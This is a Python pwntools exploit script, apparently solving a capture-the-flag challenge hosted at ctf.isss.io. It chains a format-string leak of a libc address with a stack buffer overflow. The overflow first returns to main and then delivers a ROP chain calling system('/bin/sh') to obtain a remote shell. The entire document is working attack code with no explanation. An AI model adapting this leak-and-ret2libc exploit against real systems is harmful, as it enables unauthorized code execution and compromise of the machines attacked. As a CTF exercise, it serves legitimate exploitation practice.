from pwn import *

libc = ELF("libc-2.23.so")
e = ELF("shellcode")

conn = remote("ctf.isss.io", 9009)
conn.recvline()
conn.send(b'%3$llx ' + b' '*(56 - 7) + p64(e.symbols['main']) + b'\n')

io21 = int(conn.recvline().split(b' ')[0], 16)
libcoff = io21 - libc.symbols['_IO_2_1_stdin_']
binsh = next(libc.search(b'/bin/sh')) + libcoff

rop = ROP(e)
poprdi = rop.find_gadget(["pop rdi", "ret"])[0]

conn.send(b' '*56 + p64(poprdi) + p64(binsh) + p64(libcoff + libc.symbols['system']) + b'\n')

conn.interactive()
